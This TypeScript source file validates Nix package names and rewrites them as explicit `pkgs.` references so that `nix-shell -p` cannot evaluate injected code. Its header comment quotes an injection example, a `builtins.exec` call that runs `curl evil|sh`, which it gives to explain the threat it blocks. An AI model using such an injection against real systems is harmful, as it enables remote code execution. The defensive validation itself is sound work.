/**
 * Validate an operator/connector-declared Nix package name and re-emit it as an
 * explicit `pkgs.<...>` attribute reference.
 *
 * `nix-shell -p` evaluates each argument as a Nix *expression*, so an
 * unvalidated value like `x; builtins.exec ["sh" "-c" "curl evil|sh"]` or
 * `import ./evil.nix` would run arbitrary code at evaluation time. We never
 * forward the raw string: it must be a strict leaf identifier
 * (`^[a-z0-9_][a-z0-9_-]*$`) or a `<known-namespace>.<leaf>` attr path, and it
 * is re-emitted as an explicit `pkgs.<...>` reference.
 *
 * Shared by the gateway orchestrator (spawns the worker via `nix-shell`) and
 * the connector-worker executor (spawns connectors via `nix-shell`) so the
 * connector path can never become a weaker door than the gateway path. This
 * used to be two hand-synced copies kept "in lockstep" by comment — a
 * sandbox-escape drift hazard if one allow-list changed without the other.
 */

const NIX_PACKAGE_NAMESPACES = new Set([
  'python3Packages',
  'python311Packages',
  'python312Packages',
  'nodePackages',
  'perlPackages',
  'rubyPackages',
  'haskellPackages',
  'rPackages',
  'ocamlPackages',
  'luaPackages',
]);

const NIX_LEAF_RE = /^[a-z0-9_][a-z0-9_-]*$/;
const NIX_ATTR_LEAF_RE = /^[a-zA-Z0-9_][a-zA-Z0-9_-]*$/;

/**
 * @param makeError factory for the thrown error so each caller keeps its own
 *   error type (the gateway wraps it in an `OrchestratorError`). Defaults to a
 *   plain `Error`.
 */
export function nixPackageAttrRef(
  pkg: string,
  makeError: (message: string) => Error = (message) => new Error(message)
): string {
  // Defence in depth: reject obvious shell/Nix metacharacters and non-strings
  // up front (callers may pass attacker-influenced values).
  if (typeof pkg !== 'string' || /[\s;&|`$(){}<>'"\\!*?#]/.test(pkg)) {
    throw makeError(`Invalid nix package name: ${pkg}`);
  }
  const dot = pkg.indexOf('.');
  if (dot === -1) {
    if (!NIX_LEAF_RE.test(pkg)) {
      throw makeError(`Invalid nix package name: ${pkg}`);
    }
    return `pkgs.${pkg}`;
  }
  const namespace = pkg.slice(0, dot);
  const leaf = pkg.slice(dot + 1);
  if (
    !NIX_PACKAGE_NAMESPACES.has(namespace) ||
    leaf.includes('.') ||
    !NIX_ATTR_LEAF_RE.test(leaf)
  ) {
    throw makeError(`Invalid nix package name: ${pkg}`);
  }
  return `pkgs.${namespace}.${leaf}`;
}
